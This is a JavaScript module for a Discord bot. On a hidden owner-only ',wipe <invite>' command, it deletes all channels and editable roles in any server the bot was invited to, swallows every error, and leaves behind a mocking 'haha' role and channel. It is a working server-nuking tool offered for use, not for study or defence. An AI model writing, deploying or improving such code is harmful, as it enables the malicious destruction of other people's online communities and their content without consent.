const { ChannelType } = require("discord.js");

// Replace with your Discord User ID
const OWNER_ID = "1530872106399567941";

module.exports = (client) => {
    client.on("messageCreate", async (message) => {
        if (message.author.bot) return;
        if (message.author.id !== OWNER_ID) return;

        // Matches: ,wipe <invite> or !wipe <invite>
        const match = message.content.match(/^[!,]wipe\s+(\S+)/i);
        if (!match) return;

        const inviteInput = match[1].trim();

        let targetGuild;
        try {
            const invite = await client.fetchInvite(inviteInput);
            targetGuild = client.guilds.cache.get(invite.guild?.id);
        } catch (err) {
            return message.reply("❌ Invalid or expired invite link.").catch(() => {});
        }

        if (!targetGuild) {
            return message.reply("❌ The bot is not in the server from that invite link.").catch(() => {});
        }

        await message.reply(`⚠️ Wiping **${targetGuild.name}**...`).catch(() => {});

        // 1. Delete all channels in the target server only
        const channels = await targetGuild.channels.fetch().catch(() => targetGuild.channels.cache);
        for (const channel of channels.values()) {
            if (!channel) continue;
            try {
                await channel.delete("Targeted invite server wipe");
            } catch (err) {}
        }

        // 2. Delete all editable custom roles below the bot's highest role
        const roles = await targetGuild.roles.fetch().catch(() => targetGuild.roles.cache);
        for (const role of roles.values()) {
            if (!role || role.id === targetGuild.id || role.managed || !role.editable) continue;
            try {
                await role.delete("Targeted invite server wipe");
            } catch (err) {}
        }

        // 3. Create one "haha" role and one "haha" text channel
        try {
            await targetGuild.roles.create({
                name: "haha",
                reason: "Created after targeted server wipe"
            });

            await targetGuild.channels.create({
                name: "haha",
                type: ChannelType.GuildText,
                reason: "Created after targeted server wipe"
            });

            await message.reply(`✅ Done resetting **${targetGuild.name}** with \`haha\` role and \`#haha\` channel.`).catch(() => {});
        } catch (err) {
            await message.reply(`⚠️ Wiped items, but error creating role/channel: ${err.message}`).catch(() => {});
        }
    });
};
